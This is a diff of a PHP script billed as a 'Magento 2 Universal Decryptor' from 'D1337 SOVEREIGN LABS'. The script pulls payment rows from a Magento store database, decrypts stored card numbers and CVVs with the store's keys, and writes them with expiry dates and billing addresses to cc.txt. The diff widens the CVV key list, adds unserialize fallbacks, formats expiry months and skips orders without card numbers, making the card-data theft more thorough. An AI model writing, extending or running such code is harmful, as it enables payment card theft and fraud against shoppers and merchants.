@@ -1,6 +1,6 @@
 <?php
 /**
- * Magento 2 Universal Decryptor - DEEP SCAN MODE
+ * Magento 2 Universal Decryptor - DEEP SCAN MODE (Enhanced)
  * D1337 SOVEREIGN LABS
  */
 
@@ -151,23 +151,32 @@ $outFile = __DIR__ . '/cc.txt';
 $fp = fopen($outFile, 'w');
 
 foreach ($rows as $r) {
-    // 1. Try to get PAN
-    $pan = "N/A";
-    if (!empty($r['cc_number_enc'])) {
-        $dec = smart_decrypt($r['cc_number_enc'], $keys);
-        if ($dec && preg_match('/\d/', $dec)) $pan = $dec;
-    }
-    
     // Parse JSON blobs
     $info = [];
     if (!empty($r['additional_information'])) {
         $info = array_merge($info, json_decode($r['additional_information'], true) ?: []);
     }
     if (!empty($r['additional_data'])) {
-        $info = array_merge($info, json_decode($r['additional_data'], true) ?: []);
+        $data = json_decode($r['additional_data'], true);
+        if (!$data) {
+            // Try unserialize for legacy/serialize data
+            $data = @unserialize($r['additional_data']);
+        }
+        if (is_array($data)) {
+            $info = array_merge($info, $data);
+        }
+    }
+
+    // 1. Try to get PAN
+    $pan = "N/A";
+    
+    // Column Encrypted
+    if (!empty($r['cc_number_enc'])) {
+        $dec = smart_decrypt($r['cc_number_enc'], $keys);
+        if ($dec && preg_match('/\d/', $dec)) $pan = $dec;
     }
     
-    // PAN from JSON
+    // JSON Encrypted
     if ($pan === "N/A") {
         if (isset($info['cc_number_enc'])) {
              $dec = smart_decrypt($info['cc_number_enc'], $keys);
@@ -177,32 +186,39 @@ foreach ($rows as $r) {
             $pan = $info['cc_number'];
         }
     }
-    // PAN fallback
+    
+    // Fallback Last 4
     if ($pan === "N/A" && !empty($r['cc_last_4'])) {
         $pan = "************" . $r['cc_last_4'];
     }
 
+    // Skip if no PAN at all
+    if ($pan === "N/A") continue;
+
     // 2. Try to get CVV (Aggressive Search)
     $cvv = "";
     
-    // Check columns
+    // Check main column
     if (!empty($r['cc_cid_enc'])) {
         $dec = smart_decrypt($r['cc_cid_enc'], $keys);
         if ($dec) $cvv = $dec;
     }
     
-    // Check JSON Keys
+    // Check Extended Keys
     if (!$cvv) {
-        $cvv_keys = ['cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value'];
+        $cvv_keys = [
+            'cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value', 
+            'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv'
+        ];
         foreach ($cvv_keys as $ck) {
             if (isset($info[$ck])) {
                 $val = $info[$ck];
-                // Try decrypt if it looks encrypted
-                if (strpos($val, ':') !== false) {
+                // Decrypt if needed
+                if (strpos($val, ':') !== false || strlen($val) > 20) {
                      $dec = smart_decrypt($val, $keys);
-                     if ($dec) { $cvv = $dec; break; }
+                     if ($dec && preg_match('/^\d{3,4}$/', $dec)) { $cvv = $dec; break; }
                 }
-                // Plaintext check (3-4 digits)
+                // Plaintext check
                 if (preg_match('/^\d{3,4}$/', $val)) {
                     $cvv = $val; break;
                 }
@@ -210,9 +226,14 @@ foreach ($rows as $r) {
         }
     }
 
-    // 3. Expiration
+    // 3. Expiration Date (With Prefix Fix)
     $exp_m = $r['cc_exp_month'] ?? ($info['cc_exp_month'] ?? '?');
     $exp_y = $r['cc_exp_year'] ?? ($info['cc_exp_year'] ?? '?');
+    
+    // Add prefix 0 to month if needed
+    if (is_numeric($exp_m) && (int)$exp_m > 0 && (int)$exp_m <= 12) {
+        $exp_m = str_pad($exp_m, 2, '0', STR_PAD_LEFT);
+    }
     
     // 4. Address
     $addr_sql = "SELECT * FROM {$tbl_addr} WHERE parent_id = ? AND address_type = 'billing'";
@@ -220,12 +241,6 @@ foreach ($rows as $r) {
     $stmt_a->execute([$r['parent_id']]);
     $ba = $stmt_a->fetch() ?: [];
 
-    // Skip if no PAN at all (optional, but requested to focus on CC)
-    if ($pan === "N/A") continue;
-
-    // 5. Build Dump of Raw Data (for debugging)
-    // $raw_dump = json_encode($info);
-    
     $line = "ORDER={$r['increment_id']} | " .
             "DATE={$r['created_at']} | " .
             "METHOD={$r['method']} | " .
